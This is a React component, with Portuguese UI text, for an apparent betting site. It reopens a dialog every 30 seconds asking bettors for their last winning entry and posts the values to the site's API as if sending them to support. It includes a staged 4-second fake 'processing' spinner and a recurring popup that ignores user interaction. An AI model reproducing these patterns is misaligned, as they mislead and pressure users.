import { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { useProtection } from "@/hooks/use-protection";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Loader } from "lucide-react";

// Estilo para remover o focus ring
const inputStyle = `
  .resultado-input:focus {
    outline: none !important;
    ring: 0 !important;
    box-shadow: none !important;
  }
  .spin-loader {
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
`;

const DIALOG_INTERVAL_MS = 30 * 1000; // 30 segundos
const LOADING_DURATION_MS = 4 * 1000; // 4 segundos

export function ResultadosClienteDialog() {
  useProtection(); // Proteção de código
  const [open, setOpen] = useState(false);
  const [stage, setStage] = useState<'initial' | 'loading' | 'form'>('initial'); // initial, loading, form
  const [valorApos, setValorApos] = useState("");
  const [valorSacar, setValorSacar] = useState("");
  const [errosValidacao, setErrosValidacao] = useState<{ apos?: boolean; sacar?: boolean }>({});
  const [sacarMaximoAtingido, setSacarMaximoAtingido] = useState(false);
  const { toast } = useToast();
  const queryClient = useQueryClient();

  // Abrir diálogo a cada 30 segundos (independente da interação do usuário)
  useEffect(() => {
    const timer = setInterval(() => {
      setOpen(true);
      setStage('initial');
    }, DIALOG_INTERVAL_MS);

    return () => clearInterval(timer);
  }, []);

  // Lógica de loading por 4 segundos
  useEffect(() => {
    if (stage === 'loading') {
      const loadingTimer = setTimeout(() => {
        setStage('form');
      }, LOADING_DURATION_MS);
      return () => clearTimeout(loadingTimer);
    }
  }, [stage]);

  const handleEnviarAgora = () => {
    setStage('loading');
  };

  const enviarMutation = useMutation({
    mutationFn: async (data: { apos: number; sacar: string }) => {
      const res = await apiRequest("POST", "/api/resultados-clientes", data);
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/resultados-clientes/lista"] });
      setOpen(false);
      setValorApos("");
      setValorSacar("");
      setErrosValidacao({});
    },
  });

  const enviarResultado = () => {
    const novoErros: { apos?: boolean; sacar?: boolean } = {};
    
    // Validar Apos: não vazio, número válido maior que 0, E mínimo 9 dígitos
    const aposNum = parseFloat(valorApos);
    const aposDigits = valorApos.replace(/\D/g, ''); // Remove tudo que não é dígito
    
    if (!valorApos.trim() || isNaN(aposNum) || aposNum <= 0 || aposDigits.length < 9) {
      novoErros.apos = true;
    }
    
    // Validar Sacar: não vazio E mínimo 4 dígitos
    const sacarDigits = valorSacar.replace(/\D/g, ''); // Remove tudo que não é dígito
    if (!valorSacar.trim() || sacarDigits.length < 4) {
      novoErros.sacar = true;
    }
    
    // Se houver erros, mostrar bordas vermelhas e não enviar
    if (Object.keys(novoErros).length > 0) {
      setErrosValidacao(novoErros);
      return;
    }
    
    // Limpar erros e enviar
    setErrosValidacao({});
    toast({
      title: "Conexão em andamento...",
      duration: 60000,
    });
    enviarMutation.mutate({ apos: aposNum, sacar: valorSacar });
  };

  const handleFechar = () => {
    setOpen(false);
    setStage('initial');
    setValorApos("");
    setValorSacar("");
    setErrosValidacao({});
    setSacarMaximoAtingido(false);
  };

  return (
    <>
      <style>{inputStyle}</style>
      <Dialog open={open} onOpenChange={handleFechar}>
        <DialogContent className="sm:max-w-sm mx-auto bg-black border rounded-lg" style={{ borderColor: '#333333', borderWidth: '1px', position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)' }}>
        
        {/* Header com Atenção - apenas na tela inicial */}
        {stage === 'initial' && (
          <div className="flex items-start justify-between gap-2 mb-3">
            <div className="text-yellow-600 text-sm text-center flex-1" style={{ color: '#FFD700' }}>
              ⚠️ Atenção caro apostador
            </div>
            <button
              onClick={handleFechar}
              className="text-gray-300 hover:text-white hover:bg-gray-800 rounded p-1 transition-colors flex-shrink-0"
              data-testid="button-close-resultado"
              title="Fechar"
            >
              <span className="text-xl font-bold">✕</span>
            </button>
          </div>
        )}

        {/* Botão X - nos estágios loading e form */}
        {(stage === 'loading' || stage === 'form') && (
          <div className="flex justify-end mb-3">
            <button
              onClick={handleFechar}
              className="text-gray-300 hover:text-white hover:bg-gray-800 rounded p-1 transition-colors"
              data-testid="button-close-resultado"
              title="Fechar"
            >
              <span className="text-xl font-bold">✕</span>
            </button>
          </div>
        )}

        {/* Tela Inicial com 2 botões */}
        {stage === 'initial' && (
          <div className="space-y-4">
            <DialogHeader className="pb-2">
              <DialogTitle className="text-base text-white">Nos diz: qual é a última entrada que pegou?</DialogTitle>
              <DialogDescription className="sr-only">
                Informe a última entrada vencedora
              </DialogDescription>
            </DialogHeader>
            <div className="flex gap-3">
              <Button
                onClick={handleFechar}
                variant="ghost"
                className="flex-1 bg-gray-700 hover:bg-gray-600 text-white"
                data-testid="button-depois"
              >
                Depois
              </Button>
              <Button
                onClick={handleEnviarAgora}
                className="flex-1 bg-red-700 hover:bg-red-800 text-white"
                data-testid="button-enviar-agora"
              >
                Enviar agora
              </Button>
            </div>
          </div>
        )}

        {/* Tela de Loading */}
        {stage === 'loading' && (
          <div className="flex flex-col items-center justify-center py-8">
            <Loader className="w-8 h-8 text-red-700 spin-loader mb-3" />
            <p className="text-gray-300 text-sm">Processando...</p>
          </div>
        )}

        {/* Tela de Preenchimento */}
        {stage === 'form' && (
          <div className="space-y-4">
            <DialogHeader className="pb-2">
              <DialogTitle className="text-base text-white">Nos diz: qual é a última entrada que pegou?</DialogTitle>
              <DialogDescription className="sr-only">
                Informe a última entrada vencedora
              </DialogDescription>
            </DialogHeader>

            <div className="space-y-1">
              <label className="text-sm font-medium text-gray-300">Apos:</label>
              <Input
                type="number"
                step="0.01"
                placeholder="Ex: 2.50"
                value={valorApos}
                onChange={(e) => {
                  setValorApos(e.target.value);
                  // Limpar erro individual ao digitar
                  if (errosValidacao.apos) {
                    setErrosValidacao(prev => ({ ...prev, apos: false }));
                  }
                }}
                data-testid="input-apos-resultado"
                disabled={enviarMutation.isPending}
                className={`resultado-input bg-gray-800 text-white ${
                  errosValidacao.apos ? 'border-red-600 border-2' : 'border-gray-700'
                }`}
              />
              {errosValidacao.apos && (
                <p className="text-xs text-red-600">Mínimo deve ser 9 dígitos</p>
              )}
            </div>

            <div className="space-y-1">
              <label className="text-sm font-medium text-gray-300">Sacar:</label>
              <Input
                type="text"
                placeholder="Ex: 3.20 ou 3.20L"
                value={valorSacar}
                maxLength={4}
                onChange={(e) => {
                  const novoValor = e.target.value.slice(0, 4);
                  
                  setSacarMaximoAtingido(novoValor.length === 4);
                  setValorSacar(novoValor);
                  
                  // Limpar erro individual ao digitar
                  if (errosValidacao.sacar) {
                    setErrosValidacao(prev => ({ ...prev, sacar: false }));
                  }
                }}
                data-testid="input-sacar-resultado"
                disabled={enviarMutation.isPending}
                className={`resultado-input bg-gray-800 text-white ${
                  errosValidacao.sacar ? 'border-red-600 border-2' : 'border-gray-700'
                }`}
              />
              {errosValidacao.sacar && (
                <p className="text-xs text-red-600">Mínimo deve ser 4 dígitos</p>
              )}
              {sacarMaximoAtingido && (
                <p className="text-xs text-red-600">Máximo 4 caracteres</p>
              )}
            </div>

            <Button
              onClick={enviarResultado}
              disabled={enviarMutation.isPending}
              className="w-full"
              data-testid="button-enviar-resultado"
            >
              {enviarMutation.isPending ? "Conexão em andamento..." : "Enviar para o Suporte"}
            </Button>

            <Button
              onClick={handleFechar}
              variant="ghost"
              className="w-full text-gray-400 hover:text-white"
              data-testid="button-enviar-depois-form"
            >
              Enviar depois
            </Button>
          </div>
        )}
      </DialogContent>
    </Dialog>
    </>
  );
}
